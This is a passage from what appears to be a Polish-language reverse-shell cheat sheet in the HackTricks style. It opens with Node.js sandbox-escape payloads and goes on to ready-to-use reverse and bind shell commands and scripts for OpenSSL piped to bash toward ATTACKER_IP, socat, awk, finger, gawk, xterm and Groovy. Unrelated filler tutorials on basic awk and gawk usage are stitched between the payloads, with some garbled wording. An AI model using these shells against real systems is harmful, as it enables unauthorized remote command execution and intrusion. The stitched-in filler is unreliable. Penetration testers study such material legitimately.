"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

Napastnik (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Ofiara
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Powiązane powłoki

Socat to narzędzie, które umożliwia tworzenie powłok sieciowych. Może być używane do tworzenia powłok powiązanych, które nasłuchują na określonym porcie i oczekują na połączenia przychodzące. Aby użyć Socat do utworzenia powłoki powiązanej, wykonaj następujące kroki:

1. Pobierz statyczną wersję Socat z [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries).
2. Skopiuj plik binarny Socat na celowy system.
3. Ustaw uprawnienia wykonywania dla pliku binarnego Socat.
4. Uruchom Socat, aby utworzyć powłokę powiązaną na określonym porcie.

Przykład użycia Socat do utworzenia powłoki powiązanej na porcie 4444:

```bash
socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash
```

Po wykonaniu tych kroków, Socat będzie nasłuchiwać na porcie 4444 i uruchomi powłokę bash, gdy otrzyma połączenie przychodzące.
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Odwrócony shell

Reverse shell (odwrócony shell) to technika, która umożliwia zdalne połączenie się z komputerem lub serwerem, który jest chroniony przez zaporę ogniową lub innymi mechanizmami bezpieczeństwa. W przypadku odwróconego shella, atakujący tworzy połączenie z celowym systemem, który działa jako serwer, a następnie uzyskuje zdalny dostęp do powłoki systemowej. Dzięki temu atakujący może wykonywać polecenia na zdalnym systemie, tak jakby był bezpośrednio zalogowany na tym systemie.

Istnieje wiele narzędzi i technik, które można wykorzystać do ustanowienia odwróconego shella. Jednym z popularnych narzędzi jest Netcat, które umożliwia nawiązanie połączenia TCP lub UDP z innym systemem. Innym popularnym narzędziem jest Metasploit Framework, który oferuje wiele modułów i exploitów do zdalnego wykonywania kodu.

Aby ustanowić odwrócony shell, atakujący musi najpierw umieścić kod lub skrypt na celowym systemie. Następnie atakujący uruchamia serwer, który nasłuchuje na określonym porcie. Gdy celowy system łączy się z serwerem, atakujący uzyskuje zdalny dostęp do powłoki systemowej celu.

Odwrócony shell jest często wykorzystywany przez hakerów i pentesterów do zdalnego wykonywania poleceń na celowym systemie. Jest to przydatne narzędzie w celu zdobycia kontroli nad zdalnym systemem i przeprowadzenia dalszych ataków. Dlatego ważne jest, aby administratorzy systemów byli świadomi tej techniki i podjęli odpowiednie środki bezpieczeństwa w celu ochrony swoich systemów przed atakami odwróconego shella.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk jest potężnym narzędziem do przetwarzania tekstu w systemach Linux. Może być używany do filtrowania, manipulowania i analizowania danych tekstowych. Poniżej przedstawiam kilka przykładów użycia Awk w celu zobrazowania jego funkcjonalności.

### Podstawowe użycie

Awk działa na zasadzie przetwarzania linia po linii. Domyślnie, Awk rozdziela dane na pola, używając spacji jako separatora. Możemy odwoływać się do poszczególnych pól za pomocą zmiennych $1, $2, $3 itd. Oto przykład:

```bash
$ echo "Hello World" | awk '{print $1}'
Hello
```

W powyższym przykładzie, Awk rozdzielił zdanie "Hello World" na dwa pola: "Hello" i "World". Następnie, używając polecenia `print $1`, wydrukował pierwsze pole, czyli "Hello".

### Warunkowe instrukcje

Awk umożliwia również korzystanie z warunkowych instrukcji, które pozwalają na filtrowanie danych. Możemy użyć warunku `if` wraz z instrukcją `print` w celu wydrukowania tylko tych linii, które spełniają określone kryteria. Oto przykład:

```bash
$ echo "Hello World" | awk '{if ($1 == "Hello") print $2}'
World
```

W powyższym przykładzie, Awk sprawdza, czy pierwsze pole jest równe "Hello". Jeśli tak, to drukuje drugie pole, czyli "World".

### Instrukcje pętli

Awk obsługuje również instrukcje pętli, takie jak `for` i `while`, które umożliwiają przetwarzanie danych w sposób iteracyjny. Możemy użyć tych instrukcji do wykonania określonych operacji na każdej linii danych. Oto przykład:

```bash
$ echo "Hello World" | awk '{for (i=1; i<=NF; i++) print $i}'
Hello
World
```

W powyższym przykładzie, Awk używa pętli `for`, aby przejść przez wszystkie pola w linii danych i wydrukować je oddzielnie.

### Zaawansowane funkcje

Awk oferuje również wiele zaawansowanych funkcji, takich jak `gsub`, `length`, `substr`, które umożna manipulować danymi tekstowymi w bardziej złożony sposób. Oto przykład:

```bash
$ echo "Hello World" | awk '{gsub("Hello", "Hi"); print}'
Hi World
```

W powyższym przykładzie, Awk używa funkcji `gsub`, aby zamienić wszystkie wystąpienia słowa "Hello" na "Hi" w linii danych.

To tylko kilka przykładów użycia Awk. Ten potężny narzędzie oferuje wiele innych funkcji i możliwości, które mogą być wykorzystane do przetwarzania i analizy danych tekstowych w systemach Linux.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
The attacker can use the `finger` command to gather information about users on a Linux system. The `finger` command can provide details such as the user's login name, full name, home directory, and the last time they logged in.

To use the `finger` command, the attacker can simply type `finger <username>` in the terminal. This will display the information associated with the specified user.

It is important to note that not all Linux systems have the `finger` command enabled by default. Additionally, some systems may have implemented security measures to restrict or disable the use of the `finger` command.

**Mitigation**

To mitigate the risk associated with the `finger` command, system administrators can disable or restrict its use. This can be done by modifying the `/etc/inetd.conf` file or by using access control lists (ACLs) to limit access to the `finger` service.

Additionally, it is recommended to regularly monitor system logs for any suspicious activity related to the `finger` command.
```bash
while true; do nc -l 79; done
```
Aby wysłać polecenie, zapisz je, naciśnij Enter, a następnie naciśnij CTRL+D (aby zatrzymać STDIN)

**Ofiara**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk jest potężnym narzędziem do przetwarzania tekstu w systemach Linux. Może być używany do manipulowania i analizowania danych tekstowych w różnych formatach. Poniżej przedstawiam kilka przykładów użycia Gawk w celu zobrazowania jego funkcjonalności.

### Podstawowe użycie

Aby uruchomić Gawk, użyj polecenia `gawk` w terminalu, a następnie podaj plik wejściowy, który chcesz przetworzyć. Na przykład:

```bash
gawk '{print $1}' plik.txt
```

Powyższe polecenie wyświetli pierwszą kolumnę danych z pliku `plik.txt`.

### Filtry i warunki

Gawk umożliwia filtrowanie danych na podstawie określonych warunków. Możesz użyć operatorów logicznych, takich jak `==`, `!=`, `<`, `>`, `<=` i `>=`, aby porównać wartości. Na przykład:

```bash
gawk '$3 > 50 {print $1, $2}' plik.txt
```

Powyższe polecenie wyświetli pierwszą i drugą kolumnę danych z pliku `plik.txt`, tylko jeśli wartość w trzeciej kolumnie jest większa niż 50.

### Zmienne i funkcje wbudowane

Gawk umożliwia również definiowanie zmiennych i funkcji wbudowanych. Możesz użyć zmiennych do przechowywania danych i manipulować nimi w trakcie przetwarzania. Na przykład:

```bash
gawk '{total += $1} END {print total}' plik.txt
```

Powyższe polecenie obliczy sumę wartości w pierwszej kolumnie pliku `plik.txt` i wyświetli ją na końcu przetwarzania.

### Przetwarzanie wielu plików

Gawk umożliwia przetwarzanie wielu plików jednocześnie. Możesz podać wiele plików wejściowych jako argumenty dla polecenia `gawk`. Na przykład:

```bash
gawk '{print $1}' plik1.txt plik2.txt plik3.txt
```

Powyższe polecenie wyświetli pierwszą kolumnę danych z plików `plik1.txt`, `plik2.txt` i `plik3.txt`.

### Instrukcje warunkowe

Gawk obsługuje instrukcje warunkowe, które pozwalają na wykonanie różnych działań w zależności od spełnienia określonych warunków. Możesz użyć instrukcji `if`, `else if` i `else` do tego celu. Na przykład:

```bash
gawk '{if ($1 > 0) print "Dodatnia"; else print "Ujemna"}' plik.txt
```

Powyższe polecenie wyświetli "Dodatnia", jeśli wartość w pierwszej kolumnie jest większa niż 0, w przeciwnym razie wyświetli "Ujemna".

Gawk oferuje wiele innych funkcji i możliwości, które można wykorzystać do przetwarzania danych tekstowych w systemach Linux. Zapoznanie się z dokumentacją Gawk pomoże w pełnym wykorzystaniu jego potencjału.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

To spróbuje połączyć się z Twoim systemem na porcie 6001:
```bash
xterm -display 10.0.0.1:1
```
Aby przechwycić odwróconą powłokę, możesz użyć (która będzie nasłuchiwać na porcie 6001):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

autor: [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) UWAGA: Odwrócone powłoki Java również działają dla Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Odwołania
* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby szybko je naprawić. Intruder śledzi powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
